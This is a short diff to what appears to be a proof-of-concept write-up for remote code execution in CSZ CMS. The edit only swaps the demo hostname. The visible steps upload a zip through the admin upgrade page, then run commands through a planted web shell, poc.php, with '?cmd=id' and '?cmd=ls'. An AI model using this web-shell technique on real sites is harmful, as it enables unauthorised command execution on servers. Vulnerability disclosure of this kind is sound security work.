@@ -10,7 +10,7 @@
 
 ## Steps to Reproduce:
 
-1. Enter the admin panel and go to this URL: `https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/admin/upgrade`
+1. Enter the admin panel and go to this URL: `https://demos1.page.com/CSZ_CMSqwoqwrdkog/admin/upgrade`
 
 2. Create a zip file using the command:
    ```bash
@@ -22,7 +22,7 @@
 4. Execute commands remotely:
    - Test the execution with the `id` command:
      ```
-     https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=id
+     https://demos1.page.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=id
      ```
      Expected output:
      ```
@@ -30,7 +30,7 @@
      ```
    - List directory contents using the `ls` command:
      ```
-     https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=ls
+     https://demos1.page.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=ls
      ```
      Expected output:
      ```
